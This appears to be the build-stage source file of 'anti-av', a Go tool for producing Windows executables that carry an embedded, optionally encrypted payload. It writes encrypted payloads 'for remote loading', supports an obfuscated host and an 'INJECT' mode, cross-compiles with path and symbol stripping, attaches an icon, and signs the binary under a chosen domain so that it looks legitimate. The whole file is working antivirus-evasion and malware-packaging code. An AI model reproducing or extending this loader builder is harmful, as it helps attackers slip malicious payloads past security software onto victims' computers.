package main

import (
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"

	"github.com/b1gcat/anti-av/utils"
	"github.com/sirupsen/logrus"
)

var (
	buildDir     = filepath.Join("dist", "_tmp")
	ePayloadFile = filepath.Join("dist", "payload.e")
	copyCmd      = "cp"
	export       = "export"
)

func init() {
	if runtime.GOOS == "windows" {
		copyCmd = "copy"
		export = "set"
	}
	rand.Seed(time.Now().UnixNano())
}

func (c *config) build() {
	code, err := c.generateCode()
	if err != nil {
		logrus.Error("[-] ", err.Error())
		return
	}
	//保存加密payload
	if c.crypt {
		if err := ioutil.WriteFile(ePayloadFile, code, 0755); err != nil {
			logrus.Error("[-] ", err.Error())
			return
		}
		logrus.Info("[+] Encrypted Payload For Remote Loading:", ePayloadFile)
		return
	}

	logrus.Info("[+] Generated Code Done.")
	if err := c.building(code); err != nil {
		logrus.Error("[-] ", err.Error())
		return
	}
	logrus.Info("[+] Build Done")
}

func (c *config) building(code []byte) error {
	if err := c.setup(); err != nil {
		return err
	}
	//切换到临时目录编译
	logrus.Info("[+] Enter ", buildDir)
	os.Chdir(buildDir)
	//完成后清空
	defer func() {
		logrus.Info("[+] Remove ", buildDir)
		defer os.RemoveAll(filepath.Join("..", "_tmp"))
	}()

	if err := c.prepare(code); err != nil {
		return err
	}

	if err := c.compile(); err != nil {
		return err
	}
	return nil
}

func (c *config) setup() error {
	os.RemoveAll("dist/_tmp")
	logrus.Info("[+] Create ", buildDir)
	os.Mkdir(buildDir, 0755)
	loader := filepath.Join(buildDir, c.loader)
	os.Mkdir(loader, 0755)
	if err := utils.Cmd(fmt.Sprintf("%s %s %s", copyCmd, filepath.Join("loader", c.loader, "*.go"), loader)); err != nil {
		return err
	}
	if err := utils.Cmd(fmt.Sprintf("%s %s %s", copyCmd, filepath.Join("loader", "binary", "*.go"), buildDir)); err != nil {
		return err
	}
	return nil
}

func (c *config) prepare(code []byte) error {
	ref := patch{
		CODE:            c.formatPayload(code),
		HOST_OBFUSCATOR: c.hostObfuscator,
		HACK:            "NORMAL",
		LOADER:          c.loader,
	}
	if c.inject {
		ref.HACK = "INJECT"
	}
	if err := c.patch(&ref, "."); err != nil {
		return err
	}
	return nil
}

func (c *config) compile() error {
	buildFlag := ` -gcflags=-trimpath=$GOPATH -asmflags=-trimpath=$GOPATH  -trimpath -ldflags "-s -w"`
	archs := []string{"amd64", "386"}
	compiler := map[string]string{
		"amd64": "x86_64-w64-mingw32-gcc",
		"386":   "i686-w64-mingw32-gcc",
	}
	for _, arch := range archs {
		if _, err := exec.LookPath(compiler[arch]); err != nil {
			logrus.Warnf("[-] Missing %v, stop compile %v binary", compiler[arch], arch)
			continue
		}
		utils.CreateIcoPropertity(arch)
		output := filepath.Join("..", fmt.Sprintf("antiav_windows_%s.exe", arch))
		cmd := fmt.Sprintf(`
			%s CGO_ENABLED=1
			%s CC=%s
			%s GOOS=windows
			%s GOARCH=%s
			go build %s -o %s`,
			export, export, compiler[arch], export, export, arch, buildFlag, output)
		cmdFile := "./compile"
		if runtime.GOOS == "windows" {
			cmdFile = "compile.bat"
		}
		ioutil.WriteFile(cmdFile, []byte(cmd), 0755)
		if err := utils.Cmd(cmdFile); err != nil {
			return err
		}
		os.Remove("resource_windows.syso")
		utils.SignExecutable(c.domain, output)
	}
	return nil
}
